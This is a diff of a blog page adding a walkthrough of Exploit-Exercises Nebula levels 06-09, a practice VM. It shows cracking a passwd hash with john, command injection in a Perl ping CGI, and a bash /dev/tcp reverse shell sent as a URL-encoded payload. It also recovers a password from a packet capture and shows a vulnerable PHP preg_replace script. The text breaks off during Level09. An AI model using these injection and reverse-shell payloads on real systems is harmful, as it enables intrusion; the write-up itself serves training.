@@ -9,8 +9,8 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: Exploit-Exercises: Nebula (v5) Because it was not possible to log in via ssh, we generated the host key: 1
-ssh-keygen -t rsa -f /etc/ssh/ &hellip;">
+  <meta name="description" content="Image: Exploit-Exercises: Nebula (v5) Level06 From the assignment &ldquo;The flag06 account credentials came from a legacy unix
+system&rdquo; we &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -79,6 +79,942 @@ ssh-keygen -t rsa -f /etc/ssh/ &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/17/exploit-exercises-nebula-06-10/">Exploit-Exercises: Nebula (06-10)</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-17T00:05:09+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:05 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>
+
+<h2>Level06</h2>
+
+<p>From the assignment &ldquo;The flag06 account credentials came from a legacy unix
+system&rdquo; we conclude that the password is stored in /etc/passwd.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ grep flag06 /etc/passwd
+</span><span class='line'>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We store credentials to /tmp/hash.txt and use john:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ john /tmp/hash.txt 
+</span><span class='line'>Created directory: /home/level06/.john
+</span><span class='line'>Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
+</span><span class='line'>hello            (flag06)
+</span><span class='line'>guesses: 1  time: 0:00:00:00 100% (2)  c/s: 75300  trying: 12345 - biteme
+</span><span class='line'>Use the "--show" option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can log using &lsquo;hello&rsquo; password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ su - flag06
+</span><span class='line'>Password: 
+</span><span class='line'>flag06@nebula:~$ getflag 
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level07</h2>
+
+<figure class='code'><figcaption><span>index.cgi </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;$line&quot;</span><span class="p">;</span> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># check if Host set. if not, display normal page, etc</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The configuration file is stored in &lsquo;/home/flag07/thttpd.conf&rsquo;.</p>
+
+<p>Because there is no input validation, we have RCE:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level07@nebula:~$ wget -qO- "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1"
+</span><span class='line'>&lt;html>&lt;head>&lt;title>Ping results&lt;/title>&lt;/head>&lt;body>&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.009 ms
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.023 ms
+</span><span class='line'>
+</span><span class='line'>--- 127.0.0.1 ping statistics ---
+</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 2000ms
+</span><span class='line'>rtt min/avg/max/mdev = 0.009/0.018/0.023/0.006 ms
+</span><span class='line'>&lt;/pre>&lt;/body>&lt;/html>
+</span><span class='line'>
+</span><span class='line'>level07@nebula:~$ wget -qO- "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1+%3b+id"
+</span><span class='line'>&lt;html>&lt;head>&lt;title>Ping results&lt;/title>&lt;/head>&lt;body>&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.027 ms
+</span><span class='line'>
+</span><span class='line'>--- 127.0.0.1 ping statistics ---
+</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 2000ms
+</span><span class='line'>rtt min/avg/max/mdev = 0.012/0.020/0.027/0.007 ms
+</span><span class='line'>uid=992(flag07) gid=992(flag07) groups=992(flag07)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inspired by <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>we can create reverse shell on port 1337 via bash, using ruby to encode our payload:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1337</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">ruby</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;print &#39;http://nebula:7007/index.cgi?Host=&#39; + &#39;127.0.0.1;bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1;&#39;.split(//).map{|x| &#39;%&#39; + x.ord.to_s(16)}.join + </span><span class="se">\&quot;\n\&quot;</span><span class="s2">&quot;</span>
+</span><span class='line'><span class="ss">http</span><span class="p">:</span><span class="sr">//ne</span><span class="ss">bula</span><span class="p">:</span><span class="mi">7007</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">cgi?</span><span class="no">Host</span><span class="o">=%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">68</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">d</span><span class="o">%</span><span class="mi">69</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">76</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">wget</span> <span class="o">-</span><span class="n">qO</span><span class="o">-</span> <span class="s2">&quot;http://nebula:7007/index.cgi?Host=%31%32%37%2e%30%2e%30%2e%31%3b%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%37%2e%30%2e%30%2e%31%2f%31%33%33%37%20%30%3e%26%31%3b&quot;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="no">Ping</span> <span class="n">results</span><span class="o">&lt;</span><span class="sr">/title&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">pre</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the window with nc, we got:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>flag07@nebula:/home/flag07$ id
+</span><span class='line'>id
+</span><span class='line'>uid=992(flag07) gid=992(flag07) groups=992(flag07)
+</span><span class='line'>
+</span><span class='line'>flag07@nebula:/home/flag07$ getflag
+</span><span class='line'>getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level08</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level08@nebula:/home/flag08$ tcpick -C -yU -r capture.pcap
+</span><span class='line'>Starting tcpick 0.2.1 at 2015-06-17 05:20 PDT
+</span><span class='line'>Timeout for connections is 600
+</span><span class='line'>tcpick: reading from capture.pcap
+</span><span class='line'>1      SYN-SENT       59.233.235.218:39247 > 59.233.235.223:12121
+</span><span class='line'>1      SYN-RECEIVED   59.233.235.218:39247 > 59.233.235.223:12121
+</span><span class='line'>1      ESTABLISHED    59.233.235.218:39247 > 59.233.235.223:12121
+</span><span class='line'>&lt;ff>&lt;fd>%
+</span><span class='line'>&lt;ff>&lt;fc>%
+</span><span class='line'>&lt;ff>&lt;fb>&&lt;ff>&lt;fd>&lt;18>&lt;ff>&lt;fd> &lt;ff>&lt;fd>#&lt;ff>&lt;fd>'&lt;ff>&lt;fd>$
+</span><span class='line'>&lt;ff>&lt;fe>&&lt;ff>&lt;fb>&lt;18>&lt;ff>&lt;fb> &lt;ff>&lt;fb>#&lt;ff>&lt;fb>'&lt;ff>&lt;fc>$
+</span><span class='line'>&lt;ff>&lt;fa> &lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>#&lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>'&lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lt;18>&lt;01>&lt;ff>&lt;f0>
+</span><span class='line'>&lt;ff>&lt;fa> &lt;00>38400,38400&lt;ff>&lt;f0>&lt;ff>&lt;fa>#&lt;00>SodaCan:0&lt;ff>&lt;f0>&lt;ff>&lt;fa>'&lt;00>&lt;00>DISPLAY&lt;01>SodaCan:0&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lt;18>&lt;00>xterm&lt;ff>&lt;f0>
+</span><span class='line'>&lt;ff>&lt;fb>&lt;03>&lt;ff>&lt;fd>&lt;01>&lt;ff>&lt;fd>"&lt;ff>&lt;fd>&lt;1f>&lt;ff>&lt;fb>&lt;05>&lt;ff>&lt;fd>!
+</span><span class='line'>&lt;ff>&lt;fd>&lt;03>&lt;ff>&lt;fc>&lt;01>&lt;ff>&lt;fb>"&lt;ff>&lt;fa>"&lt;03>&lt;01>&lt;00>&lt;00>&lt;03>b&lt;03>&lt;04>&lt;02>&lt;0f>&lt;05>&lt;00>&lt;00>&lt;07>b&lt;1c>&lt;08>&lt;02>&lt;04> B&lt;1a>
+</span><span class='line'>&lt;02>&lt;7f>&lt;0b>&lt;02>&lt;15>&lt;0f>&lt;02>&lt;11>&lt;10>&lt;02>&lt;13>&lt;11>&lt;02>&lt;ff>&lt;ff>&lt;12>&lt;02>&lt;ff>&lt;ff>&lt;ff>&lt;f0>&lt;ff>&lt;fb>&lt;1f>&lt;ff>&lt;fa>&lt;1f>&lt;00>&lt;b1>&lt;00>1&lt;ff>&lt;f0>&lt;ff>&lt;fd>&lt;05>&lt;ff>&lt;fb>!
+</span><span class='line'>&lt;ff>&lt;fa>"&lt;01>&lt;03>&lt;ff>&lt;f0>
+</span><span class='line'>&lt;ff>&lt;fa>"&lt;01>&lt;07>&lt;ff>&lt;f0>
+</span><span class='line'>&lt;ff>&lt;fa>!&lt;03>&lt;ff>&lt;f0>&lt;ff>&lt;fb>&lt;01>&lt;ff>&lt;fd>&lt;00>&lt;ff>&lt;fe>"
+</span><span class='line'>&lt;ff>&lt;fd>&lt;01>&lt;ff>&lt;fb>&lt;00>&lt;ff>&lt;fc>"
+</span><span class='line'>&lt;ff>&lt;fa>"&lt;03>&lt;03>&lt;e2>&lt;03>&lt;04>&lt;82>&lt;0f>&lt;07>&lt;e2>&lt;1c>&lt;08>&lt;82>&lt;04>    &lt;c2>&lt;1a>
+</span><span class='line'>&lt;82>&lt;7f>&lt;0b>&lt;82>&lt;15>&lt;0f>&lt;82>&lt;11>&lt;10>&lt;82>&lt;13>&lt;11>&lt;82>&lt;ff>&lt;ff>&lt;12>&lt;82>&lt;ff>&lt;ff>&lt;ff>&lt;f0>
+</span><span class='line'>
+</span><span class='line'>Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
+</span><span class='line'>
+</span><span class='line'>&lt;01>&lt;00>wwwbugs login: 
+</span><span class='line'>l
+</span><span class='line'>&lt;00>l
+</span><span class='line'>e
+</span><span class='line'>&lt;00>e
+</span><span class='line'>v
+</span><span class='line'>&lt;00>v
+</span><span class='line'>e
+</span><span class='line'>&lt;00>e
+</span><span class='line'>l
+</span><span class='line'>&lt;00>l
+</span><span class='line'>8
+</span><span class='line'>&lt;00>8
+</span><span class='line'>
+</span><span class='line'>&lt;01>
+</span><span class='line'>&lt;00>
+</span><span class='line'>Password: 
+</span><span class='line'>b
+</span><span class='line'>a
+</span><span class='line'>c
+</span><span class='line'>k
+</span><span class='line'>d
+</span><span class='line'>o
+</span><span class='line'>o
+</span><span class='line'>r
+</span><span class='line'>&lt;7f>
+</span><span class='line'>&lt;7f>
+</span><span class='line'>&lt;7f>
+</span><span class='line'>0
+</span><span class='line'>0
+</span><span class='line'>R
+</span><span class='line'>m
+</span><span class='line'>8
+</span><span class='line'>&lt;7f>
+</span><span class='line'>a
+</span><span class='line'>t
+</span><span class='line'>e
+</span><span class='line'>
+</span><span class='line'>&lt;00>
+</span><span class='line'>&lt;01>
+</span><span class='line'>&lt;00>
+</span><span class='line'>Login incorrect
+</span><span class='line'>wwwbugs login: 
+</span><span class='line'>1      FIN-WAIT-1     59.233.235.218:39247 > 59.233.235.223:12121
+</span><span class='line'>1      TIME-WAIT      59.233.235.218:39247 > 59.233.235.223:12121
+</span><span class='line'>1      CLOSED         59.233.235.218:39247 > 59.233.235.223:12121
+</span><span class='line'>tcpick: done reading from capture.pcap
+</span><span class='line'>
+</span><span class='line'>95 packets captured
+</span><span class='line'>1 tcp sessions detected</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see from the output above that 0x7f represents delete keystore, so the password we are looking for is &lsquo;backd00Rmate&rsquo;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level08@nebula:/home/flag08$</span> su flag08
+</span><span class='line'><span class="go">Password: </span>
+</span><span class='line'><span class="gp">sh-4.2$</span> getflag
+</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level09</h2>
+
+<figure class='code'><figcaption><span>level9.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because the flag09 binary is interpreted via php shell, there is a trivial solution:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 -h
+</span><span class='line'>Usage: php [options] [-f] &lt;file> [--] [args...]
+</span><span class='line'>       php [options] -r &lt;code> [--] [args...]
+</span><span class='line'>       php [options] [-B &lt;begin_code>] -R &lt;code> [-E &lt;end_code>] [--] [args...]
+</span><span class='line'>       php [options] [-B &lt;begin_code>] -F &lt;file> [-E &lt;end_code>] [--] [args...]
+</span><span class='line'>       php [options] -- [args...]
+</span><span class='line'>       php [options] -a
+</span><span class='line'>
+</span><span class='line'>  -a               Run as interactive shell
+</span><span class='line'>  -c &lt;path>|&lt;file> Look for php.ini file in this directory
+</span><span class='line'>  -n               No php.ini file will be used
+</span><span class='line'>  -d foo[=bar]     Define INI entry foo with value 'bar'
+</span><span class='line'>  -e               Generate extended information for debugger/profiler
+</span><span class='line'>  -f &lt;file>        Parse and execute &lt;file>.
+</span><span class='line'>  -h               This help
+</span><span class='line'>  -i               PHP information
+</span><span class='line'>  -l               Syntax check only (lint)
+</span><span class='line'>  -m               Show compiled in modules
